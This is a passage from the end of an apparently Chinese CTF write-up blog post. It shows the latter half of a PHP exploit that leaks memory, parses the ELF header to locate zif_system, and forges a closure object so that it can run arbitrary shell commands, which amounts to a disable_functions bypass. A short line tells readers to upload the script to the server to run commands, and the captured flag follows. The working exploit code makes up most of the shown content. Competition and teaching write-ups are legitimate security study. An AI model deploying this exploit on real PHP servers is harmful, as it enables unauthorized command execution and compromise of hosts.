    write($abc, 0x18, 0xa);
    $closure_obj = str2ptr($abc, 0x20);
    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die(&quot;Couldn&#39;t determine binary base address&quot;);
    }
    if(!($elf = parse_elf($base))) {
        die(&quot;Couldn&#39;t parse ELF header&quot;);
    }
    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die(&quot;Couldn&#39;t get basic_functions address&quot;);
    }
    if(!($zif_system = get_system($basic_funcs))) {
        die(&quot;Couldn&#39;t get zif_system address&quot;);
    }
    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i &lt; 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }
    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
    ($helper-&gt;b)($cmd);
    exit();
}
?&gt;
</code></pre><p>将这个上传到服务器，就能执行命令了，访问就得到了<code>flag</code>。</p>
<pre><code>flag{4424232f-959f-4923-b693-cd9b3e7e316f}
</code></pre>
                <hr>
                <div>
                    <p>
                         
                        <span class="badge badge-light">#&nbsp;writeup</span>
                        &nbsp;
                        
                    </p>
                </div>
                <br>
                
            </div>
        </div>
        <div class="d-none d-md-block col-md-2">
            
  <div id="toc" class="py-5">
    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
    <div id="tocbot"></div>
  </div>

        </div>
    </div>        
</div>

<br><br><br>

<!-- Comments -->
<div class="comments" id="comments">
 
</div>
  
  </main>

<footer class="mt-5">
  <div class="text-center py-3">
    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
    <i class="iconfont icon-love"></i>
    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
  </div>
</footer>

  <!-- SCRIPTS -->
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
  <script src="/js/main.js"></script>
  
    
      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    
    <script src="/js/post.js"></script>
    
      <script src="/js/plugins/prettify.js"></script>
      <script>
          $(document).ready(function(){
              $('pre').addClass('prettyprint linenums');
              prettyPrint();
          })
      </script>
    
  
</body>
</html>